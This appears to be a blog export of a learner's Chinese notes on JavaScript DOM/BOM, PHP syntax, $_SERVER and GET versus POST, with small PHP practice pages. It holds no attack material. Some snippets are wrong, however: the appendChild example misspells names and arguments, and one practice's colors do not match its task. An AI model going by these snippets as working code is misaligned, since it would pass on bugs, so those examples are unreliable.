class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>EventListener<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">            使用addEventListener()方法在用户点击按钮时执行函数</span><br><span class="line">        <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"myBtn"</span>&gt;</span></span><br><span class="line">          点我！</span><br><span class="line">        <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.getElementById(<span class="string">'myBtn'</span>).addEventListener(<span class="string">"click"</span>, myFunction);</span></span><br><span class="line"><span class="javascript">            <span class="function"><span class="keyword">function</span> <span class="title">myFunction</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">                alert(<span class="string">"Hello World!"</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="4"><li>创建新的HTML元素-appendChild()</li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>创建新元素<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"div1"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p1"</span>&gt;</span></span><br><span class="line">                第一个段落</span><br><span class="line">            <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"p2"</span>&gt;</span></span><br><span class="line">                第二个段落</span><br><span class="line">            <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> para=<span class="built_in">document</span>.createElement(<span class="string">"p"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> node=<span class="built_in">document</span>.createTextNode(<span class="string">"第三个段落"</span>)</span></span><br><span class="line">            para.appendChile(node);</span><br><span class="line">            </span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> element=<span class="built_in">document</span>.getElementById(<span class="string">"div1"</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> chile=<span class="built_in">document</span>.getElementById(<span class="string">"p1"</span>);</span></span><br><span class="line">            element.appendChild(para, child);</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol></li><li><p>BOM</p><p>常用函数</p><table><thead><tr><th>函数</th><th>作用</th></tr></thead><tbody><tr><td>window.open()/close()</td><td>打开新窗口/关闭当前串口</td></tr><tr><td>window.moveTo()</td><td>移动当前窗口</td></tr><tr><td>window.resizeTo()</td><td>调整当前窗口的尺寸</td></tr><tr><td>location.hostname</td><td>web主机的域名</td></tr><tr><td>location.pathname</td><td>当前页面的路径和文件名</td></tr><tr><td>location.port</td><td>web主机的端口（80/443）</td></tr><tr><td>location.protocol</td><td>web协议</td></tr><tr><td>location.href</td><td>当前页面的URL</td></tr><tr><td>loaction.assign()</td><td>加载新文档</td></tr></tbody></table><p>更多BOM函数请访问<a href="https://www.runoob.com/js/js-window.html" target="_blank" rel="noopener">BOM</a></p></li><li><p>JavaScript测试</p><p><a href="https://www.runoob.com/quiz/javascript-quiz.html" target="_blank" rel="noopener">测试网址</a></p><ol><li><p>外部脚本不能包含<code>&lt;script&gt;</code>标签。</p></li><li><p>如何在浏览器的状态栏放入一条消息？</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.status="put your message here"</span><br></pre></td></tr></table></figure></li><li><p>预测以下JavaScript输出</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">a = <span class="number">8</span> + <span class="string">"8"</span>;</span></span><br><span class="line"><span class="javascript"> <span class="built_in">document</span>.write(a);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>88</code>。</p></li><li><p>JavaScript中没有float/integer/double等数据类型。</p></li><li><p>JavaScript的.length属性用于计算任意字符串中的字符数。</p></li><li><p>trim()方法用于删除字符串开头和结尾的空格。</p></li></ol></li></ul><h3 id="4-PHP"><a href="#4-PHP" class="headerlink" title="4. PHP"></a>4. PHP</h3><ul><li><p>PHP变量</p><p>以$符号开始，必须以字母和下划线开始，变量名只能包含字母数字字符以及下划线。</p><p><strong>Note</strong>: 变量名是区分大小写的</p></li><li><p>echo和print语句</p><p>echo可以输出一个或多个字符串，输出速度比print快</p><p>print只允许输出一个字符串，返回值总为1</p></li><li><p>EOF使用说明</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$name=&quot;变量会被解析&quot;;</span><br><span class="line">$a=&lt;&lt;&lt;EOF</span><br><span class="line">$name&lt;br&gt;&lt;a&gt;html格式会被解析&lt;/a&gt;&lt;/br&gt;双引号和HTML格式外的其他内容都不会被解析   </span><br><span class="line">&quot;双引号外所有被排列好的格式都会被保留&quot;</span><br><span class="line">&quot;但是双引号内会保留转义符的转移效果，比如table:\t和换行:\n下一行&quot;</span><br><span class="line">EOF;</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li><li><p>PHP三种工作模式</p></li></ul><table><thead><tr><th align="center">工作模式</th><th>特点</th></tr></thead><tbody><tr><td align="center">CLI模式</td><td>命令行运行模式</td></tr><tr><td align="center">CGI模式</td><td>通过CGI接口从HTTP服务器取得输入，然后把运行的结果通过CGI接口交给HTTP服务器，而HTTP服务器把结果送给浏览器</td></tr><tr><td align="center">module模式</td><td>LAMP体系最常用的工作方式，php被编译为apache一个内置模块，启动时加载，当有一个php请求过来时，直接在httpd进程完成php解释运行，将结果返回。</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> summary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>练习1改进版</title>
      <link href="/2019/08/04/practice1Update/"/>
      <url>/2019/08/04/practice1Update/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: practice1实战二改进版</p><a id="more"></a><!--export--><p>根据页面的行数，生成一个不同颜色的页面，0-3红色背景，4-6蓝色背景，7-9绿色背景，10-12黑色背景，13-15紫色背景，超过为白色。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;title&gt;Line Color&lt;/title&gt;</span><br><span class="line">        &lt;style&gt;</span><br><span class="line">            ul&#123;</span><br><span class="line">                list-style-type: none;</span><br><span class="line">                margin: 0;</span><br><span class="line">                padding: 0;</span><br><span class="line">            &#125;</span><br><span class="line">        &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        $color=&quot;&quot;;</span><br><span class="line">        echo &quot;&lt;ul&gt;&quot;;</span><br><span class="line">        for($i=1; $i&lt;=15; $i++)&#123;</span><br><span class="line">                if(0&lt;=$i &amp;&amp; $i&lt;=3)&#123;</span><br><span class="line">                    $color=&quot;red&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                elseif(4&lt;=$i &amp;&amp; $i&lt;=6)&#123;</span><br><span class="line">                    $color=&quot;yellow&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                elseif(7&lt;=$i &amp;&amp; $i&lt;=9)&#123;</span><br><span class="line">                    $color=&quot;blue&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                elseif(10&lt;=$i &amp;&amp; $i&lt;=12)&#123;</span><br><span class="line">                    $color=&quot;pink&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                elseif(13&lt;=$i &amp;&amp; $i&lt;=15)&#123;</span><br><span class="line">                    $color=&quot;green&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">                echo &quot;&lt;li style=\&quot;background:$color; width=200px;color: $color\&quot;&gt;&amp;nbsp&lt;/li&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        echo &quot;&lt;/ul&gt;&quot;;</span><br><span class="line">        ?&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="/images/linecolor.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week3points</title>
      <link href="/2019/08/03/week3points/"/>
      <url>/2019/08/03/week3points/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 对第三周学习内容的扫盲</p><a id="more"></a><!--export--><h3 id="1-EOF"><a href="#1-EOF" class="headerlink" title="1. EOF"></a>1. EOF</h3><p>用下面的例子对<code>EOF</code>会有更深的理解</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$name=&quot;变量会被解析&quot;;</span><br><span class="line">$a=&lt;&lt;&lt;EOF</span><br><span class="line">        $name&lt;br&gt;&lt;a&gt;html格式会被解析&lt;/a&gt;&lt;br/&gt;双引号和html格式外的其他内容都不会被解析</span><br><span class="line">        &quot;双引号外所有被排列好的格式都会被保留&quot;</span><br><span class="line">        &quot;但是双引号内会保留转义符的转义效果，比如table:\t和换行:\n下一行&quot;</span><br><span class="line">EOF;</span><br><span class="line">echo $a;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="/images/EOF1.png" alt></p><p>若把<code>table:\t和换行:\n下一行</code>换成<code>table:\\t和换行:\\n</code>效果如下：</p><p><img src="/images/EOF2.png" alt></p><h3 id="2-PHP-SERVER"><a href="#2-PHP-SERVER" class="headerlink" title="2. PHP $_SERVER"></a>2. PHP $_SERVER</h3><p>$_SERVER是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组<a href="https://www.runoob.com/php/php-superglobals.html" target="_blank" rel="noopener">PHP SERVER</a></p><h3 id="3-GET-vs-POST"><a href="#3-GET-vs-POST" class="headerlink" title="3. GET vs POST"></a>3. GET vs POST</h3><ul><li><p>GET和POST都创建数组，此数组包含键/值对，其中的键是表单控件名称，值是来自用户输入数据</p></li><li><p>GET和POST被视作$GET和$_POST，它们超全局变量，这意味着对它们的访问无需考虑作用域—无需任何特殊代码，就能够访问它们。</p></li><li><p>$_GET通过URL参数传递到当前脚本的变量数组；</p><p>$_POST是通过HTTP POST传递到当前脚本变量数组</p></li></ul><table><thead><tr><th align="center">处理方式</th><th align="center">不同点</th></tr></thead><tbody><tr><td align="center">GET</td><td align="center">1. 所有变量名和值显示在URL中</td></tr><tr><td align="center"></td><td align="center">2. 对发送的信息数量有限制</td></tr><tr><td align="center">POST</td><td align="center">1. 发送信息不可见，信息嵌入到HTTP请求主题中</td></tr><tr><td align="center"></td><td align="center">2. 所发送信息数量无限制</td></tr></tbody></table><p>此外，POST支持高阶功能，比如在向服务器上传文件时进行multi-part二进制输入。</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
          <category> 知识盲点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>练习1</title>
      <link href="/2019/08/03/practice1/"/>
      <url>/2019/08/03/practice1/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: PHP简单实战</p><a id="more"></a><!--export--><h3 id="实战一-："><a href="#实战一-：" class="headerlink" title="实战一 ："></a>实战一 ：</h3><p>根据之前学习的HTML知识，使用PHP来编写一个页面，页面内容显示出浏览器的信息。包括浏览器信息，系统信息，文件位置信息，PHP版本，文件行数。同时保证页面的美观。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;显示浏览器信息&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;?php </span><br><span class="line">    echo $_SERVER[&quot;HTTP_USER_AGENT&quot;];</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo PHP_OS;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo __DIR__;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo PHP_VERSION;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo __LINE__;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo __FILE__;</span><br><span class="line">    ?&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>效果显示：</p><p><img src="/images/localhostBrowser.png" alt></p><h3 id="实战二-："><a href="#实战二-：" class="headerlink" title="实战二 ："></a>实战二 ：</h3><p>根据页面的行数，生成一个不同颜色的页面，0-3红色背景，4-6蓝色背景，7-9绿色背景，10-12黑色背景，13-15紫色背景，超过为白色。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo &quot;&lt;body bgcolor=\&quot;white\&quot;&gt;&lt;/body&gt; &lt;div style =&apos;background-color:red;&apos;&gt;&lt;font  color=\&quot;red\&quot;&gt;This is some text!&lt;/font&gt;&lt;/div&gt;&quot;;</span><br><span class="line"> echo &quot;&lt;div style =&apos;background-color:red;&apos;&gt;&lt;font  color=\&quot;red\&quot;&gt;This is some text!&lt;/font&gt;&lt;/div&gt;&quot;;</span><br><span class="line">    echo &quot;&lt;div style =&apos;background-color:red;&apos;&gt;&lt;font  color=\&quot;red\&quot;&gt;This is some text!&lt;/font&gt;&lt;/div&gt;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>效果显示：</p><p><img src="/images/browserColor.png" alt></p><p>缺点：刚开始的想法是使用<code>for循环</code>+<code>__LINE__</code>实现，但并实现，目前方法过于死板，有改进空间。</p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> 实战 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note15</title>
      <link href="/2019/08/03/note15/"/>
      <url>/2019/08/03/note15/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: php基础语法和变量</p><a id="more"></a><!--export--><h3 id="1-基础规范"><a href="#1-基础规范" class="headerlink" title="1. 基础规范"></a>1. 基础规范</h3><ul><li>PHP脚本形式<code>&lt;?php ?&gt;</code></li><li>PHP脚本可以单独存在，也可以与htm页面结合</li><li>PHP文件扩展名规范，一般是.php结尾，但可以使用其他命名，例如.phtm等</li></ul><h3 id="2-PHP三种运行方式"><a href="#2-PHP三种运行方式" class="headerlink" title="2. PHP三种运行方式"></a>2. PHP三种运行方式</h3><ul><li><p>CLI就是命令行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -f index.php</span><br></pre></td></tr></table></figure></li><li><p>CGI模式： Common Gateway Interface，公共网关接口，程序须运行在网络服务器上</p></li><li><p>module模式：</p></li></ul><h3 id="3-扩展加讲解"><a href="#3-扩展加讲解" class="headerlink" title="3. 扩展加讲解"></a>3. 扩展加讲解</h3><ul><li>apache服务器或nginx</li><li>php运行环境</li><li>数据库</li></ul><h3 id="4-PHP中的数据类型"><a href="#4-PHP中的数据类型" class="headerlink" title="4. PHP中的数据类型"></a>4. PHP中的数据类型</h3><h4 id="变量的数据类型："><a href="#变量的数据类型：" class="headerlink" title="变量的数据类型："></a>变量的数据类型：</h4><ul><li>布尔类型 </li><li>整型</li><li>浮点型</li><li>字符串</li><li>资源</li><li>空类型</li><li>数组</li><li>对象</li></ul><p>使用var_dump()来查看类型</p><h4 id="PHP中的变量："><a href="#PHP中的变量：" class="headerlink" title="PHP中的变量："></a>PHP中的变量：</h4><ul><li><p>变量以$符号开始，后面跟着变量的名称</p></li><li><p>变量名必须以字母或者下划线字符开始</p></li><li><p>变量民只能包含字母数字字符以及下划线（A-z、0-9和_）</p></li><li><p>变量名不能包含空格</p></li><li><p>变量名是区分大小写的</p><p>STDOUT是客户端，只能在终端显示，不能在网页显示</p></li></ul><h4 id="PHP中的常量："><a href="#PHP中的常量：" class="headerlink" title="PHP中的常量："></a>PHP中的常量：</h4><ul><li>常量一旦赋值不会改变，尽量使用大写</li><li>常量分为系统常量和自定义常量</li><li>系统常量可以理解为值不会有改变的亮</li></ul><h4 id="定义常量："><a href="#定义常量：" class="headerlink" title="定义常量："></a>定义常量：</h4><ul><li>使用PHP中的函数define()来定义常量</li><li>常量在使用的时候，不需要$符</li></ul><h4 id="常用的系统常量："><a href="#常用的系统常量：" class="headerlink" title="常用的系统常量："></a>常用的系统常量：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//php程序文件名/绝对路径</span></span><br><span class="line"><span class="keyword">__FILE__</span></span><br><span class="line"><span class="comment">//被调用的文件脚本所在的目录</span></span><br><span class="line"><span class="keyword">__DIR__</span></span><br><span class="line"><span class="comment">//函数名</span></span><br><span class="line"><span class="keyword">__FUNCTION__</span></span><br><span class="line"><span class="comment">//php程序文件行数</span></span><br><span class="line"><span class="keyword">__LINE__</span></span><br><span class="line"><span class="comment">//当前解析器的版本号</span></span><br><span class="line">PHP_VERSION</span><br><span class="line"><span class="comment">//执行当前PHP版本的操作系统名称</span></span><br><span class="line">PHP_OS</span><br></pre></td></tr></table></figure><p>​    php靠点连接字符串</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$a = <span class="string">"name"</span>;    </span><br><span class="line">    $b = <span class="string">"zs"</span>;</span><br><span class="line">$c = $a . $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="lt-lt-lt-EOF-EOF"><a href="#lt-lt-lt-EOF-EOF" class="headerlink" title="&lt;&lt;&lt;EOF EOF"></a>&lt;&lt;&lt;EOF EOF</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>p</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;h1&gt;标题&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    &lt;p&gt;段落&lt;/p&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"><span class="comment">//结束需要独立一行且前后不能空格</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>php中除了单引号，任意字符放在单引号中将没有任何意义</p></li><li><p>php中双引号输入特殊字符，将有特殊意义</p></li><li><p>EOF中变量有意义，其他特殊字符，都没有意义</p></li><li><p>转移\普通字符变为特殊字符，特殊字符为普通字符</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note14</title>
      <link href="/2019/08/01/note14/"/>
      <url>/2019/08/01/note14/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: JS BOM和jQuery，以及php环境的搭建</p><a id="more"></a><!--export--><h3 id="1-JS-BOM"><a href="#1-JS-BOM" class="headerlink" title="1. JS BOM"></a>1. JS BOM</h3><p>BOM全名Browser Object Model，即浏览器对象模型。</p><ul><li><p>Window方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#打开新窗口</span><br><span class="line"><span class="built_in">window</span>.open()</span><br><span class="line">#关闭当前窗口</span><br><span class="line"><span class="built_in">window</span>.close()</span><br><span class="line">#移动当前窗口</span><br><span class="line"><span class="built_in">window</span>.moveTo()</span><br><span class="line">#调整当前窗口的尺寸</span><br><span class="line"><span class="built_in">window</span>.resizeTo()</span><br></pre></td></tr></table></figure></li><li><p>Screen屏幕</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#可用的屏幕宽度</span><br><span class="line">screen.availWidth</span><br><span class="line">#可用的屏幕高度</span><br><span class="line">screen.availHeight</span><br></pre></td></tr></table></figure></li><li><p>Location</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#web主机的域名</span><br><span class="line">location.hostname</span><br><span class="line">#当前页面的路径和文件名</span><br><span class="line">location.pathname</span><br><span class="line">#web主机的端口（80和443）</span><br><span class="line">location.port</span><br><span class="line">#使用的web协议（http或https）</span><br><span class="line">location.protocol</span><br><span class="line">#返回当前页面的URL（也可以用作跳转）</span><br><span class="line">location.href</span><br><span class="line">#返回URL的路径名</span><br><span class="line">location.pathname</span><br><span class="line">#加载新的文档</span><br><span class="line">location.assign</span><br></pre></td></tr></table></figure></li><li><p>History</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#与在浏览器点击后退按钮相同</span><br><span class="line">history.back()</span><br><span class="line">#与在浏览器点击向前按钮相同</span><br><span class="line">history.forward()</span><br></pre></td></tr></table></figure></li><li><p>Navigator</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>navigator用法<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"example"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        txt = <span class="string">"&lt;p&gt;浏览器代号："</span> + navigator.appCodeName + <span class="string">"&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="javascript">            txt += <span class="string">"&lt;p&gt;浏览器名称："</span> + navigator.appName + <span class="string">"&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="javascript">            txt += <span class="string">"&lt;p&gt;浏览器版本："</span> + navigator.appVersion + <span class="string">"&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="javascript">            txt += <span class="string">"&lt;p&gt;启用Cookies: "</span> + navigator.cookieEnabled + <span class="string">"&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="javascript">            txt += <span class="string">"&lt;p&gt;硬件平台："</span> + navigator.platform + <span class="string">"&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="javascript">            txt += <span class="string">"&lt;p&gt;用户代理："</span> + navigator.userAgent + <span class="string">"&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="javascript">            txt += <span class="string">"&lt;p&gt;用户代理语言："</span> + navigator.systemLanguage + <span class="string">"&lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">"example"</span>).innerHTML = txt;</span></span><br><span class="line">        <span 